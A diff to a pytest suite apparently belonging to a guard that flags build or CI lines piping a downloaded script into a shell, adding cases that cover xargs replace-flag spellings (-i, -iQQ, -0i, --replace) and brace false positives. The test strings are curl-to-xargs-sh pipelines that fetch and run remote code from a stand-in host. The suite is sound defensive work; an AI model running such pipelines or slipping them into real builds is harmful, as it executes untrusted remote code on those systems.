@@ -87,6 +87,29 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh | xargs -I{} sh -c '{}'\n",
             id="xargs-interpolates-into-c",
         ),
+        # `-i` takes an OPTIONAL operand, so a following OPTION is not it. Reading `-0` as the
+        # placeholder left nothing matching `{}` in the program, and the match was lost:
+        #   printf 'echo PWNED\n' | xargs -i -0 sh -c '{}'   ->   PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | xargs -i -0 sh -c '{}'\n",
+            id="xargs-i-does-not-eat-the-next-option",
+        ),
+        # A custom placeholder, fused. `-I` was handled and `-i` was not, so this spelling fell
+        # through to a default that no longer exists.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | xargs -iQQ sh -c 'echo got QQ'\n",
+            id="xargs-fused-i-custom-placeholder",
+        ),
+        # `-i` at the end of a short-flag CLUSTER. `-0i` is `-0` plus `-i`, and everything after
+        # the letter is the placeholder -- which is why `-in1` means the name `n1`, not `-n 1`.
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | xargs -0i sh -c '{}'\n",
+            id="xargs-clustered-i",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | xargs --replace sh -c '{}'\n",
+            id="xargs-long-replace-defaults",
+        ),
         pytest.param(
             "RUN curl -sSL https://x.example/i.sh | xargs -a args.txt bash\n",
             id="xargs-arg-file-leaves-stdin",
@@ -387,6 +410,21 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # using it as the program text. `echo SAFE` runs; the download does not.
         pytest.param(
             "curl -s https://x.example/i.sh | xargs -0 sh -c 'echo SAFE'", id="xargs-c-has-operand"
+        ),
+        # `{}` is ordinary text unless a replace flag introduced it. Defaulting to `{}` whenever
+        # none was given made every jq filter and printf format containing braces match --
+        # a false positive on exactly the careful pipelines this guard exists to encourage.
+        # Confirmed literal: printf 'X\n' | xargs -0 sh -c 'echo {}'  ->  {}
+        pytest.param(
+            "curl -s https://x.example/d.json | xargs -0 sh -c 'jq {}'", id="braces-without-a-flag"
+        ),
+        pytest.param(
+            "curl -s https://x.example/d | xargs -n1 sh -c 'printf %s {}'",
+            id="braces-with-max-args",
+        ),
+        pytest.param(
+            'curl -s https://x.example/d | xargs -0 sh -c \'echo "{\\"k\\":1}"\'',
+            id="json-braces-in-a-program",
         ),
         # Operand-taking flags whose values are numbers, not files: knowing xargs' arity must not
         # over-reach into treating every following token as consumed.
